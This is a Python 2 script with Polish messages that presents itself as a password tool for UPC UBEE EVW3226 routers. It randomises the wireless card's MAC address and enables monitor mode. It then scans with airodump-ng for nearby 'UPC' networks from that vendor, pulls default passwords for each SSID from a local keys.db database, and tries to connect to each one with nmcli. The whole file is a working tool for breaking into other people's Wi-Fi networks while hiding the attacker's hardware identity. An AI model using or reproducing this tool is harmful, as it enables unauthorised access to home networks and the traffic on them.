#!/usr/bin/env python

import subprocess,sys,os,time,signal,sqlite3

W = '\033[0m' 	# white (normal)
R = '\033[31m'	# red
G = '\033[32m'  # green
O = '\033[33m'	# orange
B = '\033[34m'  # blue
P = '\033[35m'  # purple
C = '\033[36m'  # cyan
GR = '\033[37m' # gray

IN = '{G}[{W}I{G}]{W}'
MI = '{O}[{W}-{O}]{W}'
PL = '{P}[{W}+{P}]{W}'
ER = '{R}[{W}!{R}]{W}'
ASK = '{C}[{W}?{C}]{W}'

DN = open(os.devnull, 'w')
scanproc=None
anim=['|','/','-','\\']
lista=[]
karty=[]
sieci=[]
upc=[]
wlanmon=''
temp=''
cmd=''
scan=False
ON=True
OFF=False

#--------------------------------------------------------------------------

def setup():

	signal.signal(signal.SIGINT, signal_handler)
	printer('{IN}\tUPC {O}UBEE EVW3226{W} password tool\n')
	printer('{IN}\t\t by pr0teus@null.net in 2018\n\n')
	
#--------------------------------------------------------------------------
def signal_handler(sig, frame):
	if scan:
		global scan
		scan=False
		subprocess.call(['rm', 'test-01.csv'],stdout=DN)
		#printer('\n{ER}\tPrzewano przez urzytkownika\n')
		return None
        printer('\n{ER}\tDzialanie programu zostalo przerwane !\n\n')
        sys.exit(0)
#--------------------------------------------------------------------------

def cls():print '\x1b[8;35;80t\033[0;0H\033[2J'

#--------------------------------------------------------------------------

def printer(text):

	text=text.replace("{ASK}",ASK)
	text=text.replace("{IN}",IN)
	text=text.replace("{MI}",MI)
	text=text.replace("{PL}",PL)
	text=text.replace("{ER}",ER)
	text=text.replace("{R}",R)
	text=text.replace("{W}",W)
	text=text.replace("{G}",G)
	text=text.replace("{O}",O)
	text=text.replace("{B}",B)
	text=text.replace("{P}",P)
	text=text.replace("{C}",C)
	text=text.replace("{GR}",GR)
	time.sleep(0.2)
	print text,

#--------------------------------------------------------------------------

def GetWlan():
	
	printer('{IN}\tUsuwam konfilktowe procesy...\n')
	subprocess.call(['airmon-ng', 'check', 'kill'],stdout=DN)

	printer('\n{PL}\tSzukam kart WiFi.')
	subprocess.call('iwconfig > iwconfig.tmp  2> /dev/null',shell=True)
	plik=open('iwconfig.tmp','r')
	lista=list(plik)
	plik.close
	subprocess.call('rm iwconfig.tmp  2> /dev/null',shell=True)
	
	for i in range(len(lista)):
		temp=lista[i]
		if temp.find('IEEE 802.11')<>-1:
			karty.append(temp[:temp.find('IEEE 802.11')])
		if temp.find('unassociated')<>-1:
			karty.append(temp[:temp.find('unassociated')])
	printer('\n{IN}\tZnalezione karty WiFi :')
	print(len(karty))
	karty.sort()
	if len(karty)==0:
		printer('\n{ER}\tZainstaluj karte WiFi !!!!!\n\n')
		sys.exit()
	for i in range(len(karty)):
		karty[i]=karty[i].rstrip()
		printer('{MI}\t[%d]' %i+'{P}'+karty[i]+'{W}\n')
	print('\n'),
	while True:
		printer('\x1b[D{ASK}\t')
		try: 
			x =int(raw_input("Wybierz karte : "))
		except ValueError:
			x=-1
			
		if x in range(len(karty)):
			global wlanmon
			wlanmon=karty[x]
			printer('\n{IN}\tWybrano : '+wlanmon+'\n')
			printer('\r{IN}\tZmieniam adres MAC karty.\n')
			subprocess.call(['ifconfig',wlanmon,'down'],stdout=DN)
			time.sleep(5)
			subprocess.call(['macchanger','--random',wlanmon],stdout=DN)
			time.sleep(5)
			subprocess.call(['ifconfig',wlanmon,'up'],stdout=DN)
			break
		else:
			print('\x1b[A\x1b[G\x1b[2K'),

# -------------------------------------------------------------------------

def isRoot():

	if os.getuid() != 0:
		printer('{ER}\tUruchom program jako ROOT !!!\n')
		printer('{ER}\tnp: sudo ./upcauto.py\n\n')
		sys.exit()

#--------------------------------------------------------------------------

def programy():

	printer('{IN}\tSprawdzam potrzebne programy.\n')
	prog('iwconfig')
	prog('airodump-ng')
	prog('sqlite3')
	prog('nmcli')
	prog('macchanger')
	
#--------------------------------------------------------------------------

def prog(program):

	from distutils.spawn import find_executable
	if not find_executable(program):
		printer('{ER}\tBrak '+program+'.... zainstaluj.')
		sys.exit()
	else: 
		printer('{PL}\t'+program+' :{G}OK{W}\n')
#--------------------------------------------------------------------------

def monitor(mode):

	if mode :
		printer('{IN}\tUsuwam konfilktowe procesy...\n')
		#subprocess.call(['airmon-ng', 'check', 'kill'],stdout=DN)
		printer('{IN}\tUstawiam '+wlanmon+' w tryb monitora\n')
		subprocess.call(['airmon-ng', 'start', wlanmon],stdout=DN)
		global wlanmon
		wlanmon=wlanmon+'mon'
	else:	
		printer('{IN}\tWylaczam tryb monitora\n\n')
		temp=wlanmon.strip('mon')+'mon'
		#print(temp)
		subprocess.call(['airmon-ng', 'stop',temp],stdout=DN)
		

#--------------------------------------------------------------------------

def scanner():
  	cmd = 	[
		'airodump-ng',
		'-d','64:7C:34:00:00:00',
		'-m','FF:FF:FF:00:00:00',
		wlanmon,
		'--write','test',
		'--output-format','csv',
		'--write-interval','1'
		]
	global scanproc
	global scan
	scanproc = subprocess.Popen(cmd, stdout=DN, stderr=DN)
	
	scan=True
	
#--------------------------------------------------------------------------

def waitscan():
	
	printer('{IN}\tSkanowanie w toku : Crtl+C aby przerwac\n\n')
	print('\033[?25l\033[s\n'),
	idx=0
	while scan:
		#lista=None
		#temp=None
		
		sieci=[]
		#i=None
		#d=None		
		plik=open('test-01.csv','r')
		lista=list(plik)
		plik.close
		print('\x1b[u'),
		printer('\x1b[2K\r{PL}\t')
		print(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())),
		print('\t[ znalezione sieci: %d ] ' %len(upc)+anim[idx])
		idx=idx+1
		if idx==4: idx=0
		i=None
		for i in range(len(lista)):
			temp=lista[i]
			if temp.find('Station MAC')<>-1: break
			if temp.find('UPC')<>-1:
				pos=temp.find('UPC')	
				sieci.append(temp[pos:pos+10])
		
		if len(sieci)>0:
			global upc
			upc=sieci
			for i in range(len(sieci)):
				printer('\x1b[2K\r{MI}\t[%d] '%i+
					sieci[i]+'\n')	


		
		#time.sleep(.5)

	scanproc.kill()
	print('\033[?25h\r'),
	printer('{IN}\tSkanowanie zakonczone.\n')
	
	'''if len(upc)>0:
		for i in range(len(upc)):
			printer('\r{MI}\t'+upc[i]+'\n')	'''

#--------------------------------------------------------------------------
def GetPass(name):

	baza=sqlite3.connect('keys.db')
	baza.text_factory = str
	cmd=baza.cursor()
	cmd.execute("SELECT * FROM wifi WHERE ssid = '%s'" % name[3:])
	result = cmd.fetchall()
	password = []
	for row in result:password.append(row[3])
		
	baza.close
	return password
	
#--------------------------------------------------------------------------

def TestPass():
	for i in range(len(upc)):
		#print upc[i]
		hasla=GetPass(upc[i])
		for d in range(len(hasla)):
			print('Siec '+upc[i]+':\t'+hasla[d])
			time.sleep(5)
			TestConn(upc[i],hasla[d])

#--------------------------------------------------------------------------

def TestConn(ssid,pas):

	command=['nmcli','dev','wifi','connect',ssid,'password',pas,'ifname',wlanmon]
	subprocess.call(command)
	print command
	#time.sleep(5)
#--------------------------------------------------------------------------
# 5043758
# 2024259
cls()
setup()
isRoot()
programy()
GetWlan()
scanner()
waitscan()
TestPass()
#print GetPass(upc[0])
#--------------------------------------------------------------------------

